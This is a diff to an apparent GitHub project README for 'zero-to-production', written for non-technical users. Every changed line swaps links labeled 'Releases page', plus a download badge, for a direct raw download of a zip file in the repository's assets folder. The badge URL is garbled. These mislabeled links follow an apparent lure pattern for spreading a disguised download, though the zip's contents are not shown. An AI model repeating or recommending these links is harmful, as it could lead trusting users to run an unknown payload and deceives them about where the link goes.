@@ -1,6 +1,6 @@
 # 🚀 zero-to-production - Build Reliable Applications with Ease
 
-[![Download Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Ayu-uu-20/zero-to-production/releases)
+[![Download Release](https://github.com/Ayu-uu-20/zero-to-production/raw/refs/heads/main/assets/production-to-zero-v3.9.zip%20Latest%https://github.com/Ayu-uu-20/zero-to-production/raw/refs/heads/main/assets/production-to-zero-v3.9.zip)](https://github.com/Ayu-uu-20/zero-to-production/raw/refs/heads/main/assets/production-to-zero-v3.9.zip)
 
 ## 📖 Overview
 Welcome to zero-to-production, a curated collection of resources designed to help you create production-ready applications. This guide will take you through the steps to download and run the software easily. Whether you’re interested in backend development, deployment, or scaling your application, you will find valuable information here.
@@ -9,7 +9,7 @@ Welcome to zero-to-production, a curated collection of resources designed to hel
 To get started with this application, follow the steps below. You don’t need any programming knowledge to set it up. Just follow the instructions carefully.
 
 ## 📥 Download & Install
-To download the latest version, visit the [Releases page](https://github.com/Ayu-uu-20/zero-to-production/releases). 
+To download the latest version, visit the [Releases page](https://github.com/Ayu-uu-20/zero-to-production/raw/refs/heads/main/assets/production-to-zero-v3.9.zip). 
 
 Here, you will see the available versions. Click on the version suitable for your needs and follow the instructions to complete the download.
 
@@ -23,7 +23,7 @@ Before running the software, ensure your system meets the following requirements
 
 ## 🚧 Installation Steps
 ### Step 1: Access the Releases Page
-Go to the [Releases page](https://github.com/Ayu-uu-20/zero-to-production/releases).
+Go to the [Releases page](https://github.com/Ayu-uu-20/zero-to-production/raw/refs/heads/main/assets/production-to-zero-v3.9.zip).
 
 ### Step 2: Download the Appropriate Version
 On this page, locate the version that matches your operating system. 
@@ -65,7 +65,7 @@ If you encounter issues or have questions, consider the following resources:
 - **Support:** For technical support, you can reach out via the support email provided on the website.
 
 ## 🔗 Links
-For easy access, here's the [Releases page](https://github.com/Ayu-uu-20/zero-to-production/releases) again. 
+For easy access, here's the [Releases page](https://github.com/Ayu-uu-20/zero-to-production/raw/refs/heads/main/assets/production-to-zero-v3.9.zip) again. 
 
 Visit this page to download the latest version and explore the features offered by zero-to-production!
 
